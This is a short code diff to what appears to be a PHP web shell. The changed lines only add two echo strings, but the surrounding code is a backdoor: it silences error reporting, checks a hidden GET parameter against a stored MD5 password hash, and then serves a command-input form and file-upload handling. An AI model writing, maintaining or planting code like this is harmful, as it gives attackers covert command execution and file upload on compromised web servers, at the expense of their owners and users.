@@ -11,6 +11,7 @@ error_reporting(0);
 $passwd="ca2cd2bcc63c4d7c8725577442073dde";
 if(isset($_GET[bobo])){$bobo=$_GET[bobo];$_GET[bobo]=md5($_GET[bobo]);}
 if(isset($_GET[bobo])&&$_GET[bobo]==$passwd&&(!isset($_POST[upload])&&!isset($_FILES['upload_file']))){
+echo "CMD";
 echo <<<EOT
 <form name="form1" method="post" action="#">
 <input type="text" name="a" size="20" >
@@ -39,6 +40,7 @@ echo <<<EOT
 EOT;
 }
 if(!isset($_GET[bobo])){
+echo "input password";
 echo <<<EOT
 <form name="form1" method="get" action="">
 <input type="text" name="bobo" size="20" >
